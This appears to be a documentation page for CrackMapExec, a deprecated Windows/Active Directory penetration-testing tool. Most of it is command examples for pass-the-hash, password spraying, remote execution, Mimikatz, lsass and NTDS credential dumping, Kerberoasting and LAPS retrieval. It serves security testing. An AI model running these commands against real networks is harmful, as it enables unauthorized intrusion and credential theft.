---
title: "CrackMapExec Official Documentation"
category: tool
tags: [active-directory, post-exploitation, credential-dumping, lateral-movement, deprecated]
last_updated: 2025-12-27
---

# CrackMapExec Official Documentation

> **DEPRECATION NOTICE**: CrackMapExec is no longer maintained. The original repository (byt3bl33d3r/CrackMapExec) was archived on December 6, 2023. The successor project is **NetExec (nxc)**. New users should use NetExec instead.

## Overview

CrackMapExec (CME) is a post-exploitation tool designed for pentesting Windows/Active Directory environments. Often called a "swiss army knife for pentesting networks," it automates information gathering, credential attacks, and lateral movement across networks.

### Key Features

- Pure Python implementation (no external binaries required)
- Concurrent threading for fast network-wide operations
- Native WinAPI calls for credential dumping
- Built-in database for credential correlation across hosts
- Pass-the-hash and pass-the-ticket support
- Modular architecture with extensible plugin system

## Installation

### Using pipx (Recommended)

```bash
python3 -m pip install pipx
pipx ensurepath
pipx install crackmapexec
```

**Requirements**: Python 3.9+

### Using Docker

```bash
docker pull byt3bl33d3r/crackmapexec
docker run -it --entrypoint=/bin/bash byt3bl33d3r/crackmapexec
```

### From Source (Development)

```bash
apt-get install -y libssl-dev libffi-dev python-dev build-essential
git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
cd CrackMapExec
poetry install
poetry run crackmapexec
```

### Kali Linux

```bash
sudo apt install crackmapexec
```

## Command Syntax

```
crackmapexec <protocol> <target(s)> [options]
```

### Global Options

| Option | Description |
|--------|-------------|
| `-t THREADS` | Number of concurrent threads (default: 100) |
| `--timeout SECONDS` | Maximum timeout per thread |
| `--jitter INTERVAL` | Random delay between connections |
| `--verbose` | Enable verbose output |

## Supported Protocols

| Protocol | Port | Description |
|----------|------|-------------|
| smb | 445 | Windows file shares, command execution |
| winrm | 5985/5986 | Windows Remote Management |
| ldap | 389/636 | Active Directory enumeration |
| mssql | 1433 | Microsoft SQL Server |
| ssh | 22 | Linux/Unix targets |
| rdp | 3389 | Remote Desktop Protocol |
| ftp | 21 | File Transfer Protocol |

---

## SMB Protocol

### Authentication

```bash
# Username and password
crackmapexec smb <target> -u <user> -p <password>

# Pass-the-hash (full hash or NT only)
crackmapexec smb <target> -u <user> -H <NTLM_hash>
crackmapexec smb <target> -u <user> -H <NT_hash>

# Local authentication
crackmapexec smb <target> -u <user> -p <password> --local-auth

# Null session
crackmapexec smb <target> -u '' -p ''

# Password spraying
crackmapexec smb targets.txt -u users.txt -p <password> --continue-on-success
```

### Enumeration

```bash
# Enumerate shares
crackmapexec smb <target> -u <user> -p <password> --shares

# Enumerate users
crackmapexec smb <target> -u <user> -p <password> --users

# Enumerate groups
crackmapexec smb <target> -u <user> -p <password> --groups

# Enumerate logged-on users
crackmapexec smb <target> -u <user> -p <password> --loggedon-users

# Enumerate sessions
crackmapexec smb <target> -u <user> -p <password> --sessions

# Enumerate password policy
crackmapexec smb <target> -u <user> -p <password> --pass-pol

# Generate relay list (hosts without SMB signing)
crackmapexec smb <target> --gen-relay-list relay.txt
```

### Command Execution

Three execution methods with automatic failover: wmiexec (WMI), atexec (Task Scheduler), smbexec (service creation).

```bash
# Execute command (cmd.exe)
crackmapexec smb <target> -u <user> -p <password> -x "whoami"

# Execute PowerShell
crackmapexec smb <target> -u <user> -p <password> -X '$PSVersionTable'

# Force 32-bit PowerShell
crackmapexec smb <target> -u <user> -p <password> -X 'command' --force-ps32

# Specify execution method
crackmapexec smb <target> -u <user> -p <password> --exec-method atexec -x "whoami"
```

### Credential Dumping

```bash
# Dump SAM hashes (requires admin)
crackmapexec smb <target> -u <user> -p <password> --sam

# Dump LSA secrets
crackmapexec smb <target> -u <user> -p <password> --lsa

# Dump NTDS.dit (Domain Controller - drsuapi method)
crackmapexec smb <DC> -u <user> -p <password> --ntds

# Dump NTDS.dit (VSS method)
crackmapexec smb <DC> -u <user> -p <password> --ntds vss
```

### Spidering Shares

```bash
# Spider a share
crackmapexec smb <target> -u <user> -p <password> --spider <SHARE>

# Spider with pattern matching
crackmapexec smb <target> -u <user> -p <password> --spider <SHARE> --pattern <pattern>

# Spider with content search
crackmapexec smb <target> -u <user> -p <password> --spider <SHARE> --content

# Limit depth
crackmapexec smb <target> -u <user> -p <password> --spider <SHARE> --depth 3
```

### SMB Modules

List available modules:

```bash
crackmapexec smb -L
```

**Vulnerability Assessment:**

| Module | Description |
|--------|-------------|
| `zerologon` | Test for CVE-2020-1472 |
| `petitpotam` | Check DC for PetitPotam vulnerability |
| `ms17-010` | Test for MS17-010 (EternalBlue) |
| `nopac` | Check for CVE-2021-42278/42287 |
| `shadowcoerce` | Test for ShadowCoerce |
| `dfscoerce` | Check DC for DFSCoerce |

**Credential Extraction:**

| Module | Description |
|--------|-------------|
| `lsassy` | Dump lsass and parse remotely |
| `mimikatz` | Execute Mimikatz |
| `handlekatz` | Dump lsass using handlekatz64 |
| `nanodump` | Dump lsass using nanodump |
| `gpp_password` | Retrieve GPP passwords |
| `gpp_autologin` | Extract autologon credentials |
| `wdigest` | Enable/disable WDigest credential caching |
| `wireless` | Get wireless encryption keys |

**Example module usage:**

```bash
# Run lsassy module
crackmapexec smb <target> -u <user> -p <password> -M lsassy

# Run mimikatz with custom command
crackmapexec smb <target> -u <user> -p <password> -M mimikatz -o COMMAND='lsadump::sam'

# Check for zerologon
crackmapexec smb <target> -M zerologon
```

---

## WinRM Protocol

### Authentication

```bash
# Basic authentication
crackmapexec winrm <target> -u <user> -p <password>

# With domain (avoids SMB connection)
crackmapexec winrm <target> -u <user> -p <password> -d <DOMAIN>

# Pass-the-hash
crackmapexec winrm <target> -u <user> -H <hash>
```

### Command Execution

```bash
# Execute command
crackmapexec winrm <target> -u <user> -p <password> -x "hostname"

# Execute PowerShell
crackmapexec winrm <target> -u <user> -p <password> -X "Get-Process"
```

### Password Spraying

```bash
# Spray without brute force
crackmapexec winrm <target> -u userfile -p passwordfile --no-bruteforce

# Continue after success
crackmapexec winrm <target> -u users.txt -p <password> --continue-on-success
```

---

## LDAP Protocol

### Enumeration

```bash
# Get domain information
crackmapexec ldap <target> -u <user> -p <password>

# Enumerate users
crackmapexec ldap <target> -u <user> -p <password> --users

# Enumerate groups
crackmapexec ldap <target> -u <user> -p <password> --groups

# Enumerate computers
crackmapexec ldap <target> -u <user> -p <password> --computers

# Get password policy
crackmapexec ldap <target> -u <user> -p <password> --pass-pol

# Get domain trusts
crackmapexec ldap <target> -u <user> -p <password> --trusts
```

### Kerberos Attacks

```bash
# Find ASREP-roastable users
crackmapexec ldap <target> -u <user> -p <password> --asreproast output.txt

# Find Kerberoastable users
crackmapexec ldap <target> -u <user> -p <password> --kerberoasting output.txt

# Find unconstrained delegation
crackmapexec ldap <target> -u <user> -p <password> --trusted-for-delegation

# Find constrained delegation
crackmapexec ldap <target> -u <user> -p <password> --admin-count
```

### LDAP Modules

| Module | Description |
|--------|-------------|
| `MAQ` | Get MachineAccountQuota |
| `adcs` | Find AD Certificate Services |
| `laps` | Retrieve LAPS passwords |
| `get-desc-users` | Get user descriptions (may contain passwords) |
| `user-desc` | Get user descriptions |
| `daclread` | Read object DACLs |
| `subnets` | Extract AD sites and subnets |
| `ldap-checker` | Check LDAP signing requirements |

```bash
# Get LAPS passwords
crackmapexec ldap <target> -u <user> -p <password> -M laps

# Find ADCS enrollment services
crackmapexec ldap <target> -u <user> -p <password> -M adcs
```

---

## MSSQL Protocol

### Authentication

```bash
# SQL authentication
crackmapexec mssql <target> -u sa -p <password>

# Windows authentication
crackmapexec mssql <target> -u <user> -p <password> -d <DOMAIN>

# Pass-the-hash
crackmapexec mssql <target> -u <user> -H <hash> -d <DOMAIN>
```

### Command Execution

```bash
# Execute SQL query
crackmapexec mssql <target> -u <user> -p <password> -q "SELECT @@version"

# List databases
crackmapexec mssql <target> -u <user> -p <password> -q "SELECT name FROM master.dbo.sysdatabases"

# Execute OS command (requires xp_cmdshell)
crackmapexec mssql <target> -u <user> -p <password> -x "whoami"

# Execute PowerShell
crackmapexec mssql <target> -u <user> -p <password> -X '$PSVersionTable'
```

### MSSQL Modules

| Module | Description |
|--------|-------------|
| `mssql_priv` | Enumerate and exploit MSSQL privileges |
| `met_inject` | Inject Meterpreter stager |
| `web_delivery` | Metasploit web delivery payload |
| `nanodump` | Dump lsass via MSSQL |

---

## SSH Protocol

### Authentication

```bash
# Password authentication
crackmapexec ssh <target> -u <user> -p <password>

# Key authentication
crackmapexec ssh <target> -u <user> --key-file /path/to/key

# Password spraying
crackmapexec ssh targets.txt -u users.txt -p passwords.txt
```

### Command Execution

```bash
# Execute command
crackmapexec ssh <target> -u <user> -p <password> -x "id"
```

---

## Database (cmedb)

CrackMapExec stores credentials and host information in a local database.

```bash
# Access the database
cmedb

# Commands within cmedb
cmedb> workspace list
cmedb> workspace create <name>
cmedb> creds
cmedb> hosts
cmedb> export creds csv /path/to/output.csv
```

---

## Migration to NetExec

NetExec uses nearly identical syntax. Replace `crackmapexec` with `nxc`:

```bash
# CrackMapExec (deprecated)
crackmapexec smb <target> -u <user> -p <password>

# NetExec (current)
nxc smb <target> -u <user> -p <password>
```

Most modules and options are compatible. See NetExec documentation for new features and changes.

---

## References

- [Original GitHub Repository (Archived)](https://github.com/byt3bl33d3r/CrackMapExec)
- [Porchetta Industries Fork (Archived)](https://github.com/Porchetta-Industries/CrackMapExec)
- [NetExec (Successor)](https://github.com/Pennyw0rth/NetExec)
- [Kali Linux Tools - CrackMapExec](https://www.kali.org/tools/crackmapexec/)
